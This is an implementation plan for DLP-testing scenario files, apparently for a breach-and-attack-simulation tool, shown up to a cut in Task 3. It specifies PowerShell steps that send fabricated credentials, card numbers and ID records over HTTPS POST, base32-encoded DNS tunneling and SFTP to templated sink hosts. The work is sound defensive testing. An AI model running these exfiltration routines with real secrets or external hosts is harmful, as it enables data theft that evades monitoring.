# DLP Content-Type Diversity Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add 32 new content-type-diverse steps across the 8 existing DLP sink-verified exfiltration scenario files, so each channel is exercised with more than the single BFSI payload shape it currently sends.

**Architecture:** Pure scenario-authoring — no Go code changes, no scenario schema changes, no new detection-profile entries. Each new step is a literal PowerShell block following the exact pattern its file's existing step(s) already establish (same placeholders, same `technique_id`, same `detection_profiles: [windows_dlp_exfiltration]` reference), embedding one fabricated payload from the spec's Content Family Taxonomy. Every new step rolls up to its channel's *existing* finding — verification stays technique_id-keyed, unchanged.

**Tech Stack:** YAML scenario files, PowerShell (executor: powershell), the existing `internal/integrity` RSA-4096 scenario-signing scheme.

**Spec:** `orchestrator/docs/superpowers/specs/2026-09-02-dlp-content-type-diversity-design.md`

## Global Constraints

- Every new step uses `framework: custom`, `executor: powershell`, `requires_priv: user`, `timeout_sec: 30`, `fidelity: telemetry-safe`, `production_safe: true`, `risk: low`, `reversible: true`, `cleanup: ""` — identical to every existing step in these 8 files.
- Every new step references `detection_profiles: [windows_dlp_exfiltration]` and reuses its channel's *existing* `technique_id` — no new detection-profile entries, no new technique IDs.
- Every payload is `[BAS-SIM-DLP]`-tagged and uses only officially-documented non-functional placeholder values (AWS's own `AKIAIOSFODNN7EXAMPLE`, standard payment-processor test card numbers, HMRC's reserved `QQ` NINO prefix, SSA's unissued `000` SSN area) or obviously fabricated `BAS-SIM-*`/`bas-sim-*` values — per spec's Payload Safety section.
- Every step's verdict comes from the sink receipt, never from the script's own success/failure — every new step ends with the same "DLP_OBSERVATION lines are diagnostic evidence only..." comment convention already used by every existing step in these files (the HTTPS/DNS files omit this exact comment text slightly differently — match each file's own existing wording, shown per task below).
- After editing each file, its `.sig` MUST be regenerated (`go run scripts/signer.go sign private_key.pem ../scenarios/<file>.yaml` from `orchestrator/`) — an outdated signature makes the scenario engine silently refuse to load the *entire* file (confirmed via `internal/scenario/engine_test.go`'s `TestLoad_UnsignedBuiltinRefused`: builtin scenarios with an invalid/missing signature are skipped, not errored, at `Load()`).

---

### Task 1: HTTPS channel — 5 new steps

**Files:**
- Modify: `scenarios/dlp-exfiltration-sink-https.yaml`
- Modify: `scenarios/dlp-exfiltration-sink-https.yaml.sig` (regenerated, not hand-edited)

**Interfaces:**
- Consumes: existing `{{SINK_TOKEN}}` / `{{SINK_URL}}` placeholders (substituted by `internal/api/dlp_sink.go`'s `issueSinkTokensAndSubstitute`, unchanged).
- Produces: nothing consumed by later tasks — each file is independent.

- [ ] **Step 1: Append 5 new steps to `scenarios/dlp-exfiltration-sink-https.yaml`, immediately after the existing single step (before the final blank line)**

```yaml
  - name: "DLP Validation — HTTPS Exfiltration of AWS Cloud Credentials (T1567)"
    technique_id: T1567
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs a synthetic AWS-credential-shaped payload to the platform's own sink endpoint over HTTPS. No real data, no external destination -- the receiving endpoint is this same on-prem deployment."
    reversible: true
    telemetry:
      - "Sysmon EID 3: network connection to the orchestrator's own HTTPS port"
    detection:
      - "DLP: outbound HTTPS POST body matching cloud-credential patterns"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $payload = "[default]`naws_access_key_id=AKIAIOSFODNN7EXAMPLE`naws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
      try {
        Invoke-RestMethod -Uri '{{SINK_URL}}' -Method Post -Body (@{token='{{SINK_TOKEN}}'; payload=$payload; channel='https-post'} | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 10 | Out-Null
        Write-Output "EXEC T1567: AWS-credential-shaped record POSTed over HTTPS. [BAS-SIM-DLP-SINK-HTTPS]"
      } catch {
        Write-Output "EXEC T1567: HTTPS POST to sink was blocked or failed before completing. [BAS-SIM-DLP-SINK-HTTPS]"
      }
      # No local DLP_OBSERVATION marker here -- this step's verdict comes
      # entirely from whether the sink endpoint received the token, resolved
      # server-side by internal/verifysync, not from anything this script
      # can locally confirm.
    cleanup: ""

  - name: "DLP Validation — HTTPS Exfiltration of Oracle DB Connection String (T1567)"
    technique_id: T1567
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs a synthetic Oracle-DB-connection-string-shaped payload to the platform's own sink endpoint over HTTPS. No real data, no external destination -- the receiving endpoint is this same on-prem deployment."
    reversible: true
    telemetry:
      - "Sysmon EID 3: network connection to the orchestrator's own HTTPS port"
    detection:
      - "DLP: outbound HTTPS POST body matching database-connection-string patterns"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $payload = "Data Source=BAS-SIM-ORACLE;User Id=bas_sim_user;Password=BAS-SIM-DLP-Placeholder1;"
      try {
        Invoke-RestMethod -Uri '{{SINK_URL}}' -Method Post -Body (@{token='{{SINK_TOKEN}}'; payload=$payload; channel='https-post'} | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 10 | Out-Null
        Write-Output "EXEC T1567: Oracle-connection-string-shaped record POSTed over HTTPS. [BAS-SIM-DLP-SINK-HTTPS]"
      } catch {
        Write-Output "EXEC T1567: HTTPS POST to sink was blocked or failed before completing. [BAS-SIM-DLP-SINK-HTTPS]"
      }
      # No local DLP_OBSERVATION marker here -- this step's verdict comes
      # entirely from whether the sink endpoint received the token, resolved
      # server-side by internal/verifysync, not from anything this script
      # can locally confirm.
    cleanup: ""

  - name: "DLP Validation — HTTPS Exfiltration of Python Source Code (T1567)"
    technique_id: T1567
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs a synthetic Python-source-code-shaped payload (embedded fake secret) to the platform's own sink endpoint over HTTPS. No real data, no external destination -- the receiving endpoint is this same on-prem deployment."
    reversible: true
    telemetry:
      - "Sysmon EID 3: network connection to the orchestrator's own HTTPS port"
    detection:
      - "DLP: outbound HTTPS POST body matching source-code/embedded-secret patterns"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $payload = "# [BAS-SIM-DLP]`nAWS_SECRET = `"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`"  # test fixture"
      try {
        Invoke-RestMethod -Uri '{{SINK_URL}}' -Method Post -Body (@{token='{{SINK_TOKEN}}'; payload=$payload; channel='https-post'} | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 10 | Out-Null
        Write-Output "EXEC T1567: Python-source-code-shaped record POSTed over HTTPS. [BAS-SIM-DLP-SINK-HTTPS]"
      } catch {
        Write-Output "EXEC T1567: HTTPS POST to sink was blocked or failed before completing. [BAS-SIM-DLP-SINK-HTTPS]"
      }
      # No local DLP_OBSERVATION marker here -- this step's verdict comes
      # entirely from whether the sink endpoint received the token, resolved
      # server-side by internal/verifysync, not from anything this script
      # can locally confirm.
    cleanup: ""

  - name: "DLP Validation — HTTPS Exfiltration of US SSN Record (T1567)"
    technique_id: T1567
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs a synthetic US-SSN-shaped payload to the platform's own sink endpoint over HTTPS. No real data, no external destination -- the receiving endpoint is this same on-prem deployment."
    reversible: true
    telemetry:
      - "Sysmon EID 3: network connection to the orchestrator's own HTTPS port"
    detection:
      - "DLP: outbound HTTPS POST body matching US SSN patterns"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $payload = "[BAS-SIM-DLP] Name,SSN`nJohn BasSim,000-12-3456"
      try {
        Invoke-RestMethod -Uri '{{SINK_URL}}' -Method Post -Body (@{token='{{SINK_TOKEN}}'; payload=$payload; channel='https-post'} | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 10 | Out-Null
        Write-Output "EXEC T1567: US-SSN-shaped record POSTed over HTTPS. [BAS-SIM-DLP-SINK-HTTPS]"
      } catch {
        Write-Output "EXEC T1567: HTTPS POST to sink was blocked or failed before completing. [BAS-SIM-DLP-SINK-HTTPS]"
      }
      # No local DLP_OBSERVATION marker here -- this step's verdict comes
      # entirely from whether the sink endpoint received the token, resolved
      # server-side by internal/verifysync, not from anything this script
      # can locally confirm.
    cleanup: ""

  - name: "DLP Validation — HTTPS Exfiltration of Visa Card Record (T1567)"
    technique_id: T1567
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "POSTs a synthetic Visa-card-shaped payload to the platform's own sink endpoint over HTTPS. No real data, no external destination -- the receiving endpoint is this same on-prem deployment."
    reversible: true
    telemetry:
      - "Sysmon EID 3: network connection to the orchestrator's own HTTPS port"
    detection:
      - "DLP: outbound HTTPS POST body matching payment-card patterns"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $payload = "[BAS-SIM-DLP] CardBrand,CardNumber`nVisa,4111111111111111"
      try {
        Invoke-RestMethod -Uri '{{SINK_URL}}' -Method Post -Body (@{token='{{SINK_TOKEN}}'; payload=$payload; channel='https-post'} | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 10 | Out-Null
        Write-Output "EXEC T1567: Visa-card-shaped record POSTed over HTTPS. [BAS-SIM-DLP-SINK-HTTPS]"
      } catch {
        Write-Output "EXEC T1567: HTTPS POST to sink was blocked or failed before completing. [BAS-SIM-DLP-SINK-HTTPS]"
      }
      # No local DLP_OBSERVATION marker here -- this step's verdict comes
      # entirely from whether the sink endpoint received the token, resolved
      # server-side by internal/verifysync, not from anything this script
      # can locally confirm.
    cleanup: ""
```

- [ ] **Step 2: Re-sign the file**

Run from `orchestrator/`:
```bash
go run scripts/signer.go sign private_key.pem ../scenarios/dlp-exfiltration-sink-https.yaml
```
Expected: `[+] Signed ../scenarios/dlp-exfiltration-sink-https.yaml -> ../scenarios/dlp-exfiltration-sink-https.yaml.sig`

- [ ] **Step 3: Verify the file parses and loads**

Run: `go test ./internal/scenario/... -run TestLoad -v` (from `orchestrator/`)
Expected: PASS — confirms the signature is valid and no existing `Load()` test regresses. (There is no dedicated test asserting this file's step count, so a parse/load failure would only surface as a `Load()`-level issue; if you want an explicit check, run the small verification script in Task 9 against this one file first.)

- [ ] **Step 4: Commit**

```bash
git add scenarios/dlp-exfiltration-sink-https.yaml scenarios/dlp-exfiltration-sink-https.yaml.sig
git commit -m "feat(scenarios): add content-type diversity to HTTPS DLP channel"
```

---

### Task 2: DNS tunneling channel — 3 new steps

**Files:**
- Modify: `scenarios/dlp-exfiltration-dns-tunnel.yaml`
- Modify: `scenarios/dlp-exfiltration-dns-tunnel.yaml.sig` (regenerated)

**Interfaces:**
- Consumes: existing `{{SINK_DNS_CAMPAIGN_ID}}` / `{{SINK_DNS_DOMAIN}}` / `{{SINK_DNS_SERVER}}` placeholders, and the file's own `ConvertTo-Base32` PowerShell function pattern (duplicated per-step, matching this file's existing self-contained-step convention — no shared functions across steps in this codebase).
- Produces: nothing consumed by later tasks.

- [ ] **Step 1: Append 3 new steps to `scenarios/dlp-exfiltration-dns-tunnel.yaml`, immediately after the existing single step**

```yaml
  - name: "DLP Validation — DNS Tunneling of Azure Cloud Credentials (T1071.004)"
    technique_id: T1071.004
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "Issues a sequence of nslookup queries against the platform's own DNS listener (this same on-prem orchestrator, UDP/53) carrying a base32-encoded synthetic Azure-credential-shaped record split across query labels. No real DNS infrastructure is queried."
    reversible: true
    telemetry:
      - "Sysmon EID 22: DNS query, high volume of short-lived subdomain queries to the orchestrator's own DNS listener"
      - "Sysmon EID 3: UDP port 53 to the orchestrator's own address"
    detection:
      - "DLP/network: outbound DNS query volume/entropy matching data-exfiltration-via-DNS patterns"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      function ConvertTo-Base32([byte[]]$Bytes) {
        $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'
        $bits = ''
        foreach ($b in $Bytes) { $bits += [Convert]::ToString($b, 2).PadLeft(8, '0') }
        $result = ''
        for ($i = 0; $i -lt $bits.Length; $i += 5) {
          $chunkBits = $bits.Substring($i, [Math]::Min(5, $bits.Length - $i)).PadRight(5, '0')
          $result += $alphabet[[Convert]::ToInt32($chunkBits, 2)]
        }
        return $result
      }
      $payload = "{`"appId`":`"00000000-1111-0000-0000-000000000000`",`"displayName`":`"BAS-SIM-DLP-ServicePrincipal`",`"password`":`"df111111-0000-0000-0000-100000000000`",`"tenant`":`"11111111-0000-0000-0000-000000000000`"}"
      $payloadBytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
      $encoded = ConvertTo-Base32 $payloadBytes
      $chunkSize = 52
      $chunks = @()
      for ($i = 0; $i -lt $encoded.Length; $i += $chunkSize) {
        $chunks += $encoded.Substring($i, [Math]::Min($chunkSize, $encoded.Length - $i))
      }
      $sent = 0
      try {
        nslookup "000.$($chunks.Count).{{SINK_DNS_CAMPAIGN_ID}}.{{SINK_DNS_DOMAIN}}" {{SINK_DNS_SERVER}} 2>&1 | Out-Null
        for ($i = 0; $i -lt $chunks.Count; $i++) {
          $seq = "{0:D3}" -f ($i + 1)
          nslookup "$seq.$($chunks[$i]).{{SINK_DNS_CAMPAIGN_ID}}.{{SINK_DNS_DOMAIN}}" {{SINK_DNS_SERVER}} 2>&1 | Out-Null
          $sent++
        }
        Write-Output "EXEC T1071.004: Azure-credential-shaped record split into $($chunks.Count) DNS-tunneled chunks, $sent query(ies) sent. [BAS-SIM-DLP-DNS-TUNNEL]"
      } catch {
        Write-Output "EXEC T1071.004: DNS tunneling exfiltration attempt failed after $sent of $($chunks.Count) chunk(s). [BAS-SIM-DLP-DNS-TUNNEL]"
      }
      # No local DLP_OBSERVATION marker here -- this step's verdict comes
      # entirely from whether the DNS listener fully reassembled the
      # campaign, resolved server-side by internal/dnssink +
      # internal/verifysync, not from anything this script can locally
      # confirm.
    cleanup: ""

  - name: "DLP Validation — DNS Tunneling of UK National Insurance Number (T1071.004)"
    technique_id: T1071.004
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "Issues a sequence of nslookup queries against the platform's own DNS listener (this same on-prem orchestrator, UDP/53) carrying a base32-encoded synthetic UK-NINO-shaped record split across query labels. No real DNS infrastructure is queried."
    reversible: true
    telemetry:
      - "Sysmon EID 22: DNS query, high volume of short-lived subdomain queries to the orchestrator's own DNS listener"
      - "Sysmon EID 3: UDP port 53 to the orchestrator's own address"
    detection:
      - "DLP/network: outbound DNS query volume/entropy matching data-exfiltration-via-DNS patterns"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      function ConvertTo-Base32([byte[]]$Bytes) {
        $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'
        $bits = ''
        foreach ($b in $Bytes) { $bits += [Convert]::ToString($b, 2).PadLeft(8, '0') }
        $result = ''
        for ($i = 0; $i -lt $bits.Length; $i += 5) {
          $chunkBits = $bits.Substring($i, [Math]::Min(5, $bits.Length - $i)).PadRight(5, '0')
          $result += $alphabet[[Convert]::ToInt32($chunkBits, 2)]
        }
        return $result
      }
      $payload = "[BAS-SIM-DLP] Name,NINO`nJohn BasSim,QQ123456C"
      $payloadBytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
      $encoded = ConvertTo-Base32 $payloadBytes
      $chunkSize = 52
      $chunks = @()
      for ($i = 0; $i -lt $encoded.Length; $i += $chunkSize) {
        $chunks += $encoded.Substring($i, [Math]::Min($chunkSize, $encoded.Length - $i))
      }
      $sent = 0
      try {
        nslookup "000.$($chunks.Count).{{SINK_DNS_CAMPAIGN_ID}}.{{SINK_DNS_DOMAIN}}" {{SINK_DNS_SERVER}} 2>&1 | Out-Null
        for ($i = 0; $i -lt $chunks.Count; $i++) {
          $seq = "{0:D3}" -f ($i + 1)
          nslookup "$seq.$($chunks[$i]).{{SINK_DNS_CAMPAIGN_ID}}.{{SINK_DNS_DOMAIN}}" {{SINK_DNS_SERVER}} 2>&1 | Out-Null
          $sent++
        }
        Write-Output "EXEC T1071.004: UK-NINO-shaped record split into $($chunks.Count) DNS-tunneled chunks, $sent query(ies) sent. [BAS-SIM-DLP-DNS-TUNNEL]"
      } catch {
        Write-Output "EXEC T1071.004: DNS tunneling exfiltration attempt failed after $sent of $($chunks.Count) chunk(s). [BAS-SIM-DLP-DNS-TUNNEL]"
      }
      # No local DLP_OBSERVATION marker here -- this step's verdict comes
      # entirely from whether the DNS listener fully reassembled the
      # campaign, resolved server-side by internal/dnssink +
      # internal/verifysync, not from anything this script can locally
      # confirm.
    cleanup: ""

  - name: "DLP Validation — DNS Tunneling of Mastercard Card Record (T1071.004)"
    technique_id: T1071.004
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "Issues a sequence of nslookup queries against the platform's own DNS listener (this same on-prem orchestrator, UDP/53) carrying a base32-encoded synthetic Mastercard-shaped record split across query labels. No real DNS infrastructure is queried."
    reversible: true
    telemetry:
      - "Sysmon EID 22: DNS query, high volume of short-lived subdomain queries to the orchestrator's own DNS listener"
      - "Sysmon EID 3: UDP port 53 to the orchestrator's own address"
    detection:
      - "DLP/network: outbound DNS query volume/entropy matching data-exfiltration-via-DNS patterns"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      function ConvertTo-Base32([byte[]]$Bytes) {
        $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'
        $bits = ''
        foreach ($b in $Bytes) { $bits += [Convert]::ToString($b, 2).PadLeft(8, '0') }
        $result = ''
        for ($i = 0; $i -lt $bits.Length; $i += 5) {
          $chunkBits = $bits.Substring($i, [Math]::Min(5, $bits.Length - $i)).PadRight(5, '0')
          $result += $alphabet[[Convert]::ToInt32($chunkBits, 2)]
        }
        return $result
      }
      $payload = "[BAS-SIM-DLP] CardBrand,CardNumber`nMastercard,5555555555554444"
      $payloadBytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
      $encoded = ConvertTo-Base32 $payloadBytes
      $chunkSize = 52
      $chunks = @()
      for ($i = 0; $i -lt $encoded.Length; $i += $chunkSize) {
        $chunks += $encoded.Substring($i, [Math]::Min($chunkSize, $encoded.Length - $i))
      }
      $sent = 0
      try {
        nslookup "000.$($chunks.Count).{{SINK_DNS_CAMPAIGN_ID}}.{{SINK_DNS_DOMAIN}}" {{SINK_DNS_SERVER}} 2>&1 | Out-Null
        for ($i = 0; $i -lt $chunks.Count; $i++) {
          $seq = "{0:D3}" -f ($i + 1)
          nslookup "$seq.$($chunks[$i]).{{SINK_DNS_CAMPAIGN_ID}}.{{SINK_DNS_DOMAIN}}" {{SINK_DNS_SERVER}} 2>&1 | Out-Null
          $sent++
        }
        Write-Output "EXEC T1071.004: Mastercard-shaped record split into $($chunks.Count) DNS-tunneled chunks, $sent query(ies) sent. [BAS-SIM-DLP-DNS-TUNNEL]"
      } catch {
        Write-Output "EXEC T1071.004: DNS tunneling exfiltration attempt failed after $sent of $($chunks.Count) chunk(s). [BAS-SIM-DLP-DNS-TUNNEL]"
      }
      # No local DLP_OBSERVATION marker here -- this step's verdict comes
      # entirely from whether the DNS listener fully reassembled the
      # campaign, resolved server-side by internal/dnssink +
      # internal/verifysync, not from anything this script can locally
      # confirm.
    cleanup: ""
```

- [ ] **Step 2: Re-sign the file**

```bash
go run scripts/signer.go sign private_key.pem ../scenarios/dlp-exfiltration-dns-tunnel.yaml
```

- [ ] **Step 3: Verify**

Run: `go test ./internal/scenario/... -run TestLoad -v`
Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add scenarios/dlp-exfiltration-dns-tunnel.yaml scenarios/dlp-exfiltration-dns-tunnel.yaml.sig
git commit -m "feat(scenarios): add content-type diversity to DNS tunneling DLP channel"
```

---

### Task 3: SFTP channel — 5 new steps

**Files:**
- Modify: `scenarios/dlp-exfiltration-sftp.yaml`
- Modify: `scenarios/dlp-exfiltration-sftp.yaml.sig` (regenerated)

**Interfaces:**
- Consumes: existing `{{SINK_TOKEN}}` / `{{SINK_SFTP_HOST}}` / `{{SINK_SFTP_PORT}}` placeholders and the file's existing `sftp.exe` tool-presence-check pattern (`Get-Command sftp.exe`, `skip:` marker on absence).
- Produces: nothing consumed by later tasks.

- [ ] **Step 1: Append 5 new steps to `scenarios/dlp-exfiltration-sftp.yaml`, immediately after the existing single step**

```yaml
  - name: "DLP Validation — SFTP Exfiltration of MS SQL Connection String (T1048.002)"
    technique_id: T1048.002
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "Uploads a synthetic MS-SQL-connection-string-shaped file via SFTP to the platform's own SFTP listener (this same on-prem orchestrator). If the endpoint has no OpenSSH Client installed, the step is skipped rather than attempted."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on the configured SFTP sink port"
      - "Sysmon EID 1: sftp.exe process creation"
    detection:
      - "DLP/network: SSH/SFTP protocol handshake and file-transfer content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $sftpCmd = Get-Command sftp.exe -ErrorAction SilentlyContinue
      if (-not $sftpCmd) {
        Write-Output "skip: sftp.exe (OpenSSH Client) not found on this endpoint"
        exit 0
      }
      $payload = "Server=bas-sim-mssql;Database=BAS_SIM_DLP;User Id=bas_sim_user;Password=BAS-SIM-DLP-Placeholder2;"
      $tempFile = New-TemporaryFile
      Set-Content -Path $tempFile -Value $payload -NoNewline
      $remoteFile = "{{SINK_TOKEN}}.dat"
      $batchFile = New-TemporaryFile
      "put `"$($tempFile.FullName)`" `"$remoteFile`"" | Set-Content -Path $batchFile
      try {
        $output = & sftp.exe -oBatchMode=yes -oStrictHostKeyChecking=no -oUserKnownHostsFile=NUL -P {{SINK_SFTP_PORT}} -b $batchFile dlptest@{{SINK_SFTP_HOST}} 2>&1
        $exitCode = $LASTEXITCODE
        Write-Output "DLP_OBSERVATION: sftp_exit_code=$exitCode"
        foreach ($line in $output) { Write-Output "DLP_OBSERVATION: sftp_output=$line" }
        Write-Output "EXEC T1048.002: MS-SQL-connection-string-shaped SFTP exfiltration attempt completed (local exit code $exitCode -- see sink verification for the actual verdict). [BAS-SIM-DLP-SFTP]"
      } catch {
        Write-Output "DLP_OBSERVATION: sftp_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1048.002: SFTP exfiltration attempt raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-SFTP]"
      } finally {
        Remove-Item $tempFile, $batchFile -ErrorAction SilentlyContinue
      }
      # The DLP_OBSERVATION lines above are diagnostic evidence only -- this
      # step's graded verdict comes entirely from whether the SFTP sink
      # actually received the upload, resolved server-side by
      # internal/sftpsink + internal/verifysync + internal/reporting's
      # sink-primary dlpVerifier, never from this script's own exit code.
    cleanup: ""

  - name: "DLP Validation — SFTP Exfiltration of Java Source Code (T1048.002)"
    technique_id: T1048.002
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "Uploads a synthetic Java-source-code-shaped file (embedded fake secret) via SFTP to the platform's own SFTP listener (this same on-prem orchestrator). If the endpoint has no OpenSSH Client installed, the step is skipped rather than attempted."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on the configured SFTP sink port"
      - "Sysmon EID 1: sftp.exe process creation"
    detection:
      - "DLP/network: SSH/SFTP protocol handshake and file-transfer content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $sftpCmd = Get-Command sftp.exe -ErrorAction SilentlyContinue
      if (-not $sftpCmd) {
        Write-Output "skip: sftp.exe (OpenSSH Client) not found on this endpoint"
        exit 0
      }
      $payload = "// [BAS-SIM-DLP]`nString dbPassword = `"BAS-SIM-DLP-Placeholder6`"; // test fixture"
      $tempFile = New-TemporaryFile
      Set-Content -Path $tempFile -Value $payload -NoNewline
      $remoteFile = "{{SINK_TOKEN}}.dat"
      $batchFile = New-TemporaryFile
      "put `"$($tempFile.FullName)`" `"$remoteFile`"" | Set-Content -Path $batchFile
      try {
        $output = & sftp.exe -oBatchMode=yes -oStrictHostKeyChecking=no -oUserKnownHostsFile=NUL -P {{SINK_SFTP_PORT}} -b $batchFile dlptest@{{SINK_SFTP_HOST}} 2>&1
        $exitCode = $LASTEXITCODE
        Write-Output "DLP_OBSERVATION: sftp_exit_code=$exitCode"
        foreach ($line in $output) { Write-Output "DLP_OBSERVATION: sftp_output=$line" }
        Write-Output "EXEC T1048.002: Java-source-code-shaped SFTP exfiltration attempt completed (local exit code $exitCode -- see sink verification for the actual verdict). [BAS-SIM-DLP-SFTP]"
      } catch {
        Write-Output "DLP_OBSERVATION: sftp_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1048.002: SFTP exfiltration attempt raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-SFTP]"
      } finally {
        Remove-Item $tempFile, $batchFile -ErrorAction SilentlyContinue
      }
      # The DLP_OBSERVATION lines above are diagnostic evidence only -- this
      # step's graded verdict comes entirely from whether the SFTP sink
      # actually received the upload, resolved server-side by
      # internal/sftpsink + internal/verifysync + internal/reporting's
      # sink-primary dlpVerifier, never from this script's own exit code.
    cleanup: ""

  - name: "DLP Validation — SFTP Exfiltration of Financial Statement (T1048.002)"
    technique_id: T1048.002
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "Uploads a synthetic financial-statement-shaped file via SFTP to the platform's own SFTP listener (this same on-prem orchestrator). If the endpoint has no OpenSSH Client installed, the step is skipped rather than attempted."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on the configured SFTP sink port"
      - "Sysmon EID 1: sftp.exe process creation"
    detection:
      - "DLP/network: SSH/SFTP protocol handshake and file-transfer content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $sftpCmd = Get-Command sftp.exe -ErrorAction SilentlyContinue
      if (-not $sftpCmd) {
        Write-Output "skip: sftp.exe (OpenSSH Client) not found on this endpoint"
        exit 0
      }
      $payload = "[BAS-SIM-DLP] Financial Statement (Synthetic)`nCompany: BAS-SIM-Corp`nRevenue: `$0.00 (synthetic)`nNet Income: `$0.00 (synthetic)"
      $tempFile = New-TemporaryFile
      Set-Content -Path $tempFile -Value $payload -NoNewline
      $remoteFile = "{{SINK_TOKEN}}.dat"
      $batchFile = New-TemporaryFile
      "put `"$($tempFile.FullName)`" `"$remoteFile`"" | Set-Content -Path $batchFile
      try {
        $output = & sftp.exe -oBatchMode=yes -oStrictHostKeyChecking=no -oUserKnownHostsFile=NUL -P {{SINK_SFTP_PORT}} -b $batchFile dlptest@{{SINK_SFTP_HOST}} 2>&1
        $exitCode = $LASTEXITCODE
        Write-Output "DLP_OBSERVATION: sftp_exit_code=$exitCode"
        foreach ($line in $output) { Write-Output "DLP_OBSERVATION: sftp_output=$line" }
        Write-Output "EXEC T1048.002: Financial-statement-shaped SFTP exfiltration attempt completed (local exit code $exitCode -- see sink verification for the actual verdict). [BAS-SIM-DLP-SFTP]"
      } catch {
        Write-Output "DLP_OBSERVATION: sftp_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1048.002: SFTP exfiltration attempt raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-SFTP]"
      } finally {
        Remove-Item $tempFile, $batchFile -ErrorAction SilentlyContinue
      }
      # The DLP_OBSERVATION lines above are diagnostic evidence only -- this
      # step's graded verdict comes entirely from whether the SFTP sink
      # actually received the upload, resolved server-side by
      # internal/sftpsink + internal/verifysync + internal/reporting's
      # sink-primary dlpVerifier, never from this script's own exit code.
    cleanup: ""

  - name: "DLP Validation — SFTP Exfiltration of Israeli ID Record (T1048.002)"
    technique_id: T1048.002
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "Uploads a synthetic Israeli-ID-shaped file via SFTP to the platform's own SFTP listener (this same on-prem orchestrator). If the endpoint has no OpenSSH Client installed, the step is skipped rather than attempted."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on the configured SFTP sink port"
      - "Sysmon EID 1: sftp.exe process creation"
    detection:
      - "DLP/network: SSH/SFTP protocol handshake and file-transfer content inspection"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $sftpCmd = Get-Command sftp.exe -ErrorAction SilentlyContinue
      if (-not $sftpCmd) {
        Write-Output "skip: sftp.exe (OpenSSH Client) not found on this endpoint"
        exit 0
      }
      $payload = "[BAS-SIM-DLP] Name,ID`nJohn BasSim,000000000"
      $tempFile = New-TemporaryFile
